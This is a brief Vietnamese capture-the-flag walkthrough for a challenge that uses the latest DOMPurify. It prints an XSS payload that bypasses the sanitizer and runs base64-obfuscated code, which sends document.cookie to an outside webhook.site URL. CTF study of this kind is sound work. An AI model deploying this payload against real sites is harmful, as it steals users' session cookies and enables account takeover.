# Đề bài:
![Screenshot 2024-11-08 213448](https://github.com/user-attachments/assets/4bd306ad-6cad-4e85-bc68-204930bc9c7e)

# Walkthrough:
- Bài sử dụng DOMpurify bản mới nhất là 3.17, do đó ta phải tìm kiếm trên mạng payload để bypass
- Ta tìm thấy: https://x.com/kinugawamasato/status/1843687909431582830
- Payload:
```
<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=eval(atob('ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzNmMDIxNzM2LTA2YmItNDgzNS1iZDgyLTU1ZDFlYjEzNmM4Nj9jb29raWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWUpKQ=='))>">">
```

